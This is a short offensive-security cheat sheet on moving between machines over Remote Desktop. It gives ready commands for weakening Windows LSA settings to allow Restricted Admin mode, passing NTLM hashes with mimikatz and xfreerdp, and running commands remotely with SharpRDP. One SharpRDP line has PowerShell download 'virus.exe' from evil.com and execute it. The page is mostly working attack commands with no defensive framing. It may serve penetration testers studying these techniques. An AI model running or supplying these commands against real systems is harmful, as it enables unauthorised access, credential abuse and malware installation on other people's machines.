# Remote desktop

## Windows RDP

{% hint style="info" %}
/admin allows to not disconnect connected user
{% endhint %}

```csharp
 mstsc.exe /admin
```

### Restricted Admin

Allow to use the current user credentials session to make a network connection without entering a password.

#### Enable Restricted admin

```csharp
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
```

```csharp
 mstsc.exe /restrictedadmin 
```

### Using mimikatz

```csharp
sekurlsa::pth /user:admin /domain:domain /ntlm:<NTLM HASH> /run:"mstsc.exe /restrictedadmin"
```

## SharpRDP

### RDP in console

```csharp
SharpRDP.exe computername=target command=notepad username=domain\user password=password!
```

#### Remote code Execution

```text
sharprdp.exe computername=target command="powershell (New-Object
System.Net.WebClient).DownloadFile('http://evil.com/virus.exe',
'C:\Windows\Tasks\virus.exe'); C:\Windows\Tasks\virus.exe" username=domain\user password=password!
```



## Linux RDP

### xfreerdp

#### Domain + NTLM hash

```csharp
xfreerdp /d:domain  /u:user  /pth:NTLM_HASH  /v:DEST_IP
```

#### Local machine

```csharp
proxychains  xfreerdp   /u:b3v1l /p:Password!  /v:172.16.1.16
```

### rdesktop

```csharp
rdesktop DEST_IP   -u Domain\User -p Password
```

